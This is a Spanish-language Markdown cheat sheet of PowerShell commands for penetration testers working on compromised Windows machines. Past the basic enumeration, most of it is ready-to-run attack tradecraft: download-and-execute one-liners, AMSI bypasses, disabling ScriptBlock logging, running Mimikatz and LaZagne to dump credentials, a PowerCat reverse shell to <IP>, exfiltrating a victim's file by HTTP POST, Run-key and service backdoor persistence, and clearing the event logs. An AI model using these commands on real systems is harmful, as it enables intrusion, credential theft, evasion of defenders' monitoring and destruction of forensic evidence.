# 🛠️ PowerShell for Pentesters

Comandos útiles en PowerShell para tareas de reconocimiento, post-explotación, evasión y búsqueda de información sensible en sistemas Windows comprometidos.

---

## 📋 Ver servicios

```powershell
Get-Service | ForEach-Object { $_.Name }

```

📍 Ubicaciones de los servicios ejecutados

```powershell
Get-WmiObject -Class win32_service | Format-List *

Get-WmiObject -Class win32_service | Sort-Object -Property PathName -Unique | Format-List PathName
```

🧠 Listar procesos únicos

```powershell
Get-Process | Sort-Object -Property ProcessName -Unique
```

👤 Enumeración de usuarios

```powershell
whoami
whoami /all
Get-WmiObject -Class Win32_ComputerSystem | Select-Object UserName
Get-LocalUser
net user
```

🛡️ Grupos y privilegios

```powershell
net localgroup administrators
```

🌐 Enumeración de red

```powershell
Get-NetAdapter | Format-Table
Get-NetIPAddress | Format-Table
Get-NetRoute
Get-NetTCPConnection | Where-Object { $_.State -eq "Established" }
```

🖥️ Información del sistema

```powershell
Get-WmiObject -Class Win32_OperatingSystem
Get-WmiObject -Class Win32_ComputerSystem
Get-ChildItem Env:
```

🔍 Buscar archivos sensibles por contenido

```powershell
Select-String -Path "C:\\Users\\*\\Documents\\*.txt" -Pattern "password"

Get-ChildItem -Path "C:\\Users" -Recurse -Include *.txt -ErrorAction SilentlyContinue |
Select-String -Pattern "password"
```

🗂️ Buscar archivos sensibles por nombre

```powershell
Get-ChildItem -Path "C:\\Users" -Recurse -ErrorAction SilentlyContinue -Force |
Where-Object { $_.Name -match "password|contraseña" }

Get-ChildItem -Path "C:\\Users" -Recurse -Include *password*,*passwords*,*contraseña* -File -ErrorAction SilentlyContinue
```

📅 Persistencia

```powershell
Get-ScheduledTask | Select-Object TaskName, TaskPath, State
Get-ChildItem -Path "C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
```

🔧 Descarga y ejecución remota de scripts

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://<IP>/script.ps1")
```


🧱 Bypass de restricciones

```powershell

[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
# AVANZADO

🔐 Credenciales en memoria

```powershell
# Dump de credenciales con Mimikatz (si ya tienes permisos)
Invoke-Expression -Command "& {Invoke-WebRequest -Uri 'http://<IP>/mimikatz.exe' -OutFile 'C:\Windows\Temp\mimikatz.exe'; Start-Process 'C:\Windows\Temp\mimikatz.exe'}"
```
💡 Alternativamente, puedes ejecutar Mimikatz directamente en PowerShell usando Invoke-Mimikatz de PowerSploit si lo cargas manualmente.

🧠 Enumerar software instalado
```powershell
Get-WmiObject -Class Win32_Product | Select-Object Name, Version
```

🧰 Enumerar programas en ejecución
```powershell
gps | where {$_.Path -like "*Program Files*"} | select Name, Path
```

📄 Archivos recientes abiertos por usuarios
```powershell
Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\Recent" -Recurse
```

🧾 Ver historial de PowerShell
```powershell
Get-Content (Get-PSReadlineOption).HistorySavePath
```

🕳️ POST-EXPLOTACIÓN / PRIVILEGE ESCALATION


🔒 Buscar archivos con permisos inseguros

```powershell
icacls "C:\Program Files" | findstr "(F)"  # Busca archivos con permisos Full para Everyone o Users
```

🧬 Información de drivers y controladores
```powershell
Get-WmiObject Win32_SystemDriver | Where-Object { $_.State -eq "Running" } | Select Name, PathName
```

🔌 Enumerar DLL hijacking targets

```powershell
Get-ChildItem -Path "C:\Program Files\", "C:\Program Files (x86)\" -Recurse -Include *.exe -ErrorAction SilentlyContinue |
ForEach-Object {
    $dllPath = Join-Path $_.DirectoryName "example.dll"
    if (-Not (Test-Path $dllPath)) {
        Write-Output "$dllPath podría ser vulnerable"
    }
}
```

🧱 BYPASS DE SEGURIDAD AVANZADO


🔓 Desactivar el AMSI (variante mejorada)

```powershell
$Amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$Field = $Amsi.GetField('amsiInitFailed','NonPublic,Static')
$Field.SetValue($null,$true)
```

🔍 Desactivar ScriptBlock Logging

```powershell
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Name "EnableScriptBlockLogging" -Value 0
```

📤 EXFILTRACIÓN Y COMUNICACIÓN

🔄 Exfiltrar archivos a servidor remoto

```powershell
Invoke-WebRequest -Uri "http://<IP>/upload" -Method POST -InFile "C:\Users\victim\Desktop\important.docx"
```

🛰️ Reversar Shell con PowerShell (PowerCat)

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
powercat -c <IP> -p 4444 -e cmd
```

🕵️‍♂️ PERSISTENCIA AVANZADA


🧠 Añadir key en el registro para persistencia

```powershell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Update" -Value "C:\malicious\reverse.exe"
```

🧱 Crear servicio persistente

```powershell
New-Service -Name "UpdateService" -BinaryPathName "C:\malicious\backdoor.exe" -StartupType Automatic
Start-Service -Name "UpdateService"
```

🧽 LIMPIEZA Y EVIDENCIAS

🧹 Borrar logs de eventos

```powershell
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
```

⚠️ Solo para cuando ya no se requiere mantener presencia, o como parte de un ejercicio controlado.

📚 FUENTES Y HERRAMIENTAS RECOMENDADAS
PowerSploit

PowerView: https://github.com/PowerShellMafia/PowerSploit 

Nishang: https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon

PowerCat: https://github.com/besimorhino/powercat

Empire (PS Agent): https://github.com/BC-SECURITY/Empire


# CREDENCIALES CON LZAGNE

```powershell
Invoke-WebRequest -Uri "https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe" -OutFile "$env:TEMP\lazagne.exe"

$lazagnePath = "$env:TEMP\lazagne.exe"

# Ejecutar módulo 'browsers' para sacar todas las credenciales de navegadores
$result = & $lazagnePath browsers

# Mostrar resultado en consola
Write-Output $result

# Guardar resultado en archivo
$result | Out-File -FilePath "$env:TEMP\browser_passwords.txt" -Encoding utf8


```
